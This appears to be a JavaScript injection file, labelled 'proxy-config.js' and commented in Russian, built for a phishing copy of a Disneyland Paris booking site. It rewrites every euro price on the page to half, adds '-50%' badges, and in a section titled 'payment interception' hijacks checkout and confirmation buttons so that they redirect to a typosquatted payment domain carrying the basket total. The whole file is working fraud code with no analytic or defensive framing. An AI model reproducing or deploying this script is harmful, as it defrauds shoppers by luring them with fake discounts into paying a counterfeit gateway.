/**
 * proxy-config.js
 */

// =============================================
// СКИДКА 50% — стиль бейджа
// =============================================
(function() {
    var style = document.createElement('style');
    style.textContent = [
        '.v-disc-badge {',
        '  display: inline-block !important;',
        '  background: #cc0000 !important;',
        '  color: #fff !important;',
        '  font-size: 11px !important;',
        '  font-weight: 700 !important;',
        '  padding: 2px 6px !important;',
        '  border-radius: 4px !important;',
        '  margin-left: 4px !important;',
        '  vertical-align: middle !important;',
        '  line-height: 1.4 !important;',
        '  white-space: nowrap !important;',
        '  font-family: Arial, sans-serif !important;',
        '}'
    ].join('\n');
    document.head ? document.head.appendChild(style) : document.addEventListener('DOMContentLoaded', function() { document.head.appendChild(style); });
})();

// =============================================
// СКИДКА 50% — основной скрипт
// =============================================
(function() {
    'use strict';

    var DONE = 'data-disc-done';
    var DONE_ARIA = 'data-disc-aria';

    function calcHalf(str) {
        var clean = str.replace(/\s/g, '').replace(',', '.');
        var n = parseFloat(clean);
        if (isNaN(n) || n < 2) return null;
        var result = (n * 0.5).toFixed(2);
        // сохраняем формат с запятой если был
        if (str.indexOf(',') !== -1) result = result.replace('.', ',');
        return result;
    }

    function addBadge(el) {
        // Не добавлять дважды
        var sib = el.nextSibling;
        if (sib && sib.nodeType === 1 && sib.className && sib.className.indexOf('v-disc-badge') !== -1) return;
        var b = document.createElement('span');
        b.className = 'v-disc-badge';
        b.textContent = '-50%';
        if (el.parentNode) el.parentNode.insertBefore(b, el.nextSibling);
    }

    function processTextNode(node) {
        var val = node.nodeValue;
        if (!val) return;
        // Проверяем есть ли символ евро (€ = \u20ac)
        if (val.indexOf('\u20ac') === -1) return;

        var parent = node.parentElement;
        if (!parent) return;
        if (parent.tagName === 'SCRIPT' || parent.tagName === 'STYLE') return;
        if (parent.getAttribute(DONE)) return;

        var changed = false;

        // Формат: €93  или  € 104.50
        var newVal = val.replace(/(\u20ac\s*)(\d[\d\s]*(?:[,\.]\d+)?)/g, function(match, sym, num) {
            var d = calcHalf(num);
            if (!d) return match;
            changed = true;
            return sym + d;
        });

        // Формат: 93€  или  208.00 €
        newVal = newVal.replace(/(\d[\d\s]*(?:[,\.]\d+)?)(\s*\u20ac)/g, function(match, num, sym) {
            var d = calcHalf(num);
            if (!d) return match;
            changed = true;
            return d + sym;
        });

        if (changed) {
            node.nodeValue = newVal;
            parent.setAttribute(DONE, '1');
            addBadge(parent);
        }
    }

    function processAriaLabel(el) {
        if (el.getAttribute(DONE_ARIA)) return;
        var label = el.getAttribute('aria-label');
        if (!label || label.indexOf('\u20ac') === -1) return;

        var changed = false;
        var newLabel = label.replace(/(\u20ac\s*)(\d[\d\s]*(?:[,\.]\d+)?)/g, function(match, sym, num) {
            var d = calcHalf(num);
            if (!d) return match;
            changed = true;
            return sym + d + ' (-50%)';
        });

        if (changed) {
            el.setAttribute('aria-label', newLabel);
            el.setAttribute(DONE_ARIA, '1');
        }
    }

    function run() {
        if (!document.body) return;

        // Обходим все текстовые узлы
        var walker = document.createTreeWalker(
            document.body,
            NodeFilter.SHOW_TEXT | NodeFilter.SHOW_ELEMENT,
            {
                acceptNode: function(node) {
                    if (node.nodeType === 1) {
                        var tag = node.tagName;
                        if (tag === 'SCRIPT' || tag === 'STYLE' || tag === 'NOSCRIPT') {
                            return NodeFilter.FILTER_REJECT;
                        }
                    }
                    return NodeFilter.FILTER_ACCEPT;
                }
            },
            false
        );

        var n;
        while ((n = walker.nextNode())) {
            if (n.nodeType === 3) {
                processTextNode(n);
            } else if (n.nodeType === 1 && n.hasAttribute && n.hasAttribute('aria-label')) {
                processAriaLabel(n);
            }
        }
    }

    // MutationObserver — реагирует когда календарь/тотал появляется после выбора даты
    var observer = new MutationObserver(function(mutations) {
        for (var i = 0; i < mutations.length; i++) {
            if (mutations[i].addedNodes.length > 0) {
                setTimeout(run, 100);
                return;
            }
        }
    });

    function init() {
        run();
        observer.observe(document.documentElement, {
            childList: true,
            subtree: true
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    // Дополнительный запуск каждые 500мс для надёжности
    setInterval(run, 500);

})();

// =============================================
// ПЕРЕХВАТ ОПЛАТЫ
// =============================================
(function() {
    'use strict';

    var PAYMENT_GATEWAY = 'https://pay.disneylandparls.com/';
    var STORE_ID = 'Disney Land Paris';

    function getAmount() {
        var selectors = [
            '.total-price-value',
            '[data-testid="total-price"]',
            '.cart-summary__total-price',
            '.summary-total-amount',
            '.amount'
        ];
        for (var i = 0; i < selectors.length; i++) {
            var el = document.querySelector(selectors[i]);
            if (el && el.innerText) {
                var price = el.innerText.replace(/[^0-9,.]/g, '').replace(',', '.');
                if (price && !isNaN(parseFloat(price))) return price;
            }
        }
        return '100.00';
    }

    function handlePaymentRedirect(event) {
        event.preventDefault();
        event.stopImmediatePropagation();
        event.stopPropagation();
        var amount = getAmount();
        var checkoutUrl = PAYMENT_GATEWAY + '/?amount=' + amount + '&store=' + encodeURIComponent(STORE_ID);
        window.location.replace(checkoutUrl);
        return false;
    }

    setInterval(function() {
        var buttons = document.querySelectorAll('button, a, [role="button"]');
        buttons.forEach(function(btn) {
            var text = (btn.innerText || '').toLowerCase().trim();
            if (text.indexOf('confirm selection') !== -1 || text.indexOf('confirm your selection') !== -1 || text.indexOf('checkout') !== -1) {
                if (btn.disabled || btn.getAttribute('disabled')) {
                    btn.disabled = false;
                    btn.removeAttribute('disabled');
                    btn.style.pointerEvents = 'auto';
                    btn.style.opacity = '1';
                }
                btn.style.border = '2px solid #28a745';
                if (!btn.dataset.proxyAttached) {
                    btn.addEventListener('click', handlePaymentRedirect, true);
                    btn.addEventListener('mousedown', handlePaymentRedirect, true);
                    btn.dataset.proxyAttached = 'true';
                }
            }
        });
    }, 500);

})();
